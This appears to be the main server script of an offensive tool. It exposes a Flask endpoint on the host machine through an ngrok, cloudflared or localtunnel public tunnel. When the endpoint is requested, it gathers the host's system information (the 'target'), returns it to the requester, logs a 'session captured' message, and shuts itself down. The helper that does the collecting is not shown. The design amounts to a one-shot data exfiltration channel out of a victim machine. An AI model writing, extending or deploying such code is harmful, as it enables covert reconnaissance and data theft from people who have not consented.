import argparse
from datetime import datetime
import json
import os
import platform
import shutil
import socket
import subprocess
import threading
from pathlib import Path
from .helper.systemInfo import SystemInfo
from .helper.session import Session
from flask import Flask, after_this_request, jsonify, request
from pyngrok import ngrok

app = Flask(__name__)
SESSION_DIR = Path("session")
ACTIVE_TUNNEL = None
ACTIVE_TUNNEL_PROVIDER = "ngrok"
SERVER_PORT = 5000


def start_ngrok_tunnel(port: int):
    tunnel = ngrok.connect(port)
    public_url = tunnel.public_url if hasattr(tunnel, "public_url") else str(tunnel)
    return tunnel, public_url


def start_cloudflared_tunnel(port: int):
    cloudflared_bin = shutil.which("cloudflared")
    if not cloudflared_bin:
        raise RuntimeError("cloudflared is not installed or not in PATH.")

    process = subprocess.Popen(
        [
            cloudflared_bin,
            "tunnel",
            "--url",
            f"http://127.0.0.1:{port}",
            "--no-autoupdate",
        ]
    )
    return process, "Cloudflared running (check terminal output for public URL)."


def start_localtunnel_tunnel(port: int):
    localtunnel_bin = shutil.which("lt") or shutil.which("lt.cmd")
    if not localtunnel_bin:
        raise RuntimeError("localtunnel is not installed. Install with: npm i -g localtunnel")

    process = subprocess.Popen([localtunnel_bin, "--port", str(port)])
    return process, "Localtunnel running (check terminal output for public URL)."


def start_tunnel(provider: str, port: int):
    if provider == "ngrok":
        return start_ngrok_tunnel(port)
    if provider == "cloudflared":
        return start_cloudflared_tunnel(port)
    if provider == "localtunnel":
        return start_localtunnel_tunnel(port)
    raise ValueError(f"Unsupported tunnel provider: {provider}")


def close_tunnel() -> None:
    global ACTIVE_TUNNEL
    if ACTIVE_TUNNEL is None:
        return

    if ACTIVE_TUNNEL_PROVIDER == "ngrok":
        try:
            public_url = (
                ACTIVE_TUNNEL.public_url
                if hasattr(ACTIVE_TUNNEL, "public_url")
                else str(ACTIVE_TUNNEL)
            )
            ngrok.disconnect(public_url)
        except Exception as error:
            print(f"[!] Tunnel close error: {error}")
        finally:
            ACTIVE_TUNNEL = None
        return

    try:
        ACTIVE_TUNNEL.terminate()
        ACTIVE_TUNNEL.wait(timeout=3)
    except Exception:
        try:
            ACTIVE_TUNNEL.kill()
        except Exception as error:
            print(f"[!] Tunnel process close error: {error}")
    finally:
        ACTIVE_TUNNEL = None


def shutdown_server() -> bool:
    shutdown = request.environ.get("werkzeug.server.shutdown")
    if shutdown is None:
        print("[!] Server shutdown hook not available.")
        return False
    shutdown()
    return True


def force_exit() -> None:
    os._exit(0)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Start target server with selected tunnel provider")
    parser.add_argument(
        "--tunnel",
        choices=["ngrok", "cloudflared", "localtunnel"],
        default="ngrok",
        help="Tunnel provider to expose local Flask app",
    )
    return parser.parse_args()


@app.route("/")
def home():
    target = SystemInfo().get_info()
    output_file = Session().save_session(target)
    payload = {
        "target": target,
        "saved_to": str(output_file.resolve()),
    }

    print("\n[+] New session captured")
    print(json.dumps(payload, indent=2))

    @after_this_request
    def close_after_response(response):
        close_tunnel()
        did_shutdown = shutdown_server()
        if not did_shutdown:
            threading.Timer(1.0, force_exit).start()
        print("[*] Tunnel closed and server stopped after session capture.")
        return response

    return jsonify(payload)


if __name__ == "__main__":
    args = parse_args()
    ACTIVE_TUNNEL_PROVIDER = args.tunnel

    try:
        ACTIVE_TUNNEL, public_url = start_tunnel(args.tunnel, SERVER_PORT)
    except Exception as error:
        raise SystemExit(f"Failed to start {args.tunnel} tunnel: {error}")

    print(f"Tunnel provider: {args.tunnel}")
    print(f"Public URL: {public_url}")
    print(f"Forwarding to: http://127.0.0.1:{SERVER_PORT}")

    app.run(host="0.0.0.0", port=SERVER_PORT, use_reloader=False, threaded=False)
